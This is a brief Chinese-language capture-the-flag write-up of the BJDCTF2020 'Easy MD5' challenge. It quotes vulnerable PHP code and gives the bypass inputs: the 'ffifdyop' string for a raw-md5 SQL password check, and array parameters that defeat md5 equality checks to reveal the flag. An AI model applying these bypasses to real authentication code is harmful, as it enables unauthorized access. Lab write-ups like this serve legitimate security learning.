# [BJDCTF2020]Easy MD5 1

- 进入网页，是一个查询入口，尝试常见的查询语句均无效，尝试堆叠注入无效，进行抓包，查看Response，发现了 `select * from 'admin' where password=md5($pass,true)`

> <img src="../../IMG2/Screenshot 2024-05-21 183605.png">

- 这里的参数传入的位置是where，所以常规的SQL注入是无效的，对于md5()函数，有一个专门的字符串 `ffifdyop` 用于绕过，因此传入 `ffifdyop` ，得到新页面，查看源代码发现PHP代码，进行审计

```php
<?php
$a = $GET['a'];
$b = $_GET['b'];

if($a != $b && md5($a) == md5($b)){
    // wow, glzjin wants a girl friend.
?>
```

- 这个代码审计很简单，使用数组绕过md5()即可

`?a[]=1&b[]=2`

- 又得到PHP源代码，进行审计

```php
 <?php
error_reporting(0);
include "flag.php";

highlight_file(__FILE__);

if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){
    echo $flag;
} 
```

- 这个上一个没什么两样，同样使用数组绕过，得到flag

`param1[]=1&param2[]=2`

> <img src="../../IMG2/Screenshot 2024-05-21 190855.png">